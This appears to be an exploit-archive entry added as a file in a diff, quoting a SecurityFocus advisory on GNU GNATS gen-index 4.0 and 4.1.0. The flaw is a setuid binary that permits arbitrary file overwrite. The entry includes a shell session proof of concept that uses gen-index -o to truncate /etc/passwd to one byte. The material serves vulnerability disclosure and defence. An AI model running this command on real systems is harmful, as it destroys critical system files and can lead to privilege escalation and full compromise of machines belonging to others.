@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/14169/info
+
+GNU GNATS gen-index allows local attackers to disclose and overwrite arbitrary files.
+
+A successful attack can result in privilege escalation and a complete compromise of the affected computer as gen-index is installed with setuid permissions.
+
+GNU GNATS 4.0 and 4.1.0 are reported to be affected. Other versions may be vulnerable as well. 
+
+pi3@darkstar:~$ pwd
+/home/pi3
+pi3@darkstar:~$ ls -alh /etc/passwd
+-rw-r--r-- 1 root root 795 May 19 18:49 /etc/passwd
+pi3@darkstar:~$ ls -alh /usr/local/libexec/gnats/gen-index
+-r-sr-xr-x 1 root root 465k Nov 21 2004 /usr/local/libexec/gnats/gen-index*
+pi3@darkstar:~$ /usr/local/libexec/gnats/gen-index -n -o /etc/passwd
+pi3@darkstar:~$ ls -alh /etc/passwd
+-rw-r--r-- 1 root root 1 Jun 16 17:34 /etc/passwd
+pi3@darkstar:~$ cat /etc/passwd 
